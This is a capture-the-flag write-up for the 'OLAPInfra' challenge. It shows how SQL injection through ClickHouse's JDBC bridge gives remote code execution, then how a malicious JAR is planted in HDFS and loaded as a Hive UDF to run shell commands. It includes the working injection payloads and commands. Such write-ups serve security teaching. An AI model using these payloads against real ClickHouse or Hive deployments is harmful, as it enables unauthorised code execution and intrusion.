OLAPInfra
=========

An easily solvable but challenging to setup challenge.

10 solves.

## Writeup


### Step 1

It is evident from the [ClickHouse documentation](https://github.com/ClickHouse/clickhouse-jdbc-bridge/blob/v2.1.0/README.md#usage) that the `clickhouse-jdbc-bridge` possesses the capability to execute JavaScript by Nashorn. Just RCE:

```sql
1=0 UNION ALL SELECT results, '', '', '' FROM jdbc('script:', 'java.lang.Runtime.getRuntime().exec("id")')
```

Some teams used SQLite JDBC's RCE [CVE-2023-32697](https://nvd.nist.gov/vuln/detail/CVE-2023-32697).

### Step 2

[Hive documentation](https://cwiki.apache.org/confluence/display/Hive/LanguageManual+DDL#LanguageManualDDL-CreateFunction) said Hive allows loading JAR file in HDFS to make a new UDF.

I'm using ClickHouse to manipulate HDFS directly. Alternatively, one could upload a HDFS client to accomplish this. To write data from ClickHouse to HDFS, the `INSERT INTO` statement is required. However, since nested queries are not supported by default, JDBC is needed to perform this operation.


```sql
1=0 UNION ALL SELECT results, '', '', '' FROM jdbc('jdbc:clickhouse://127.0.0.1:8123', CREATE_HDFS_SQL)
```

CREATE_HDFS_SQL=
```sql
CREATE TABLE hdfs_test (name String) ENGINE=HDFS('hdfs://namenode:8020/a.jar', 'Native');
INSERT INTO hdfs_test SETTINGS hdfs_create_new_file_on_insert=TRUE VALUES (unhex(UDF_HEX_DATA))
```

## Step 3

The need now arises to directly manipulate Hive from ClickHouse container. It becomes apparent that ClickHouse's Hive integration connects to the Metastore rather than HiveServer2 and also retrieves data from HDFS. Hive uses the Thrift protocol, which seems incompatible with ClickHouse's `url()` to establish a connection. So executing arbitrary Hive SQL directly with ClickHouse appears unlikely.

I uploaded a lightweight Hive client (1.4MB) written in Golang+UPX.

## Step 4

Simply instruct Hive to load the UDF in Clickhouse.

```bash
./clickhouse-to-hive "CREATE FUNCTION default.v as 'udf.Exec' USING JAR 'hdfs:///a.jar'"
./clickhouse-to-hive "SELECT default.v('uname -a')"
```
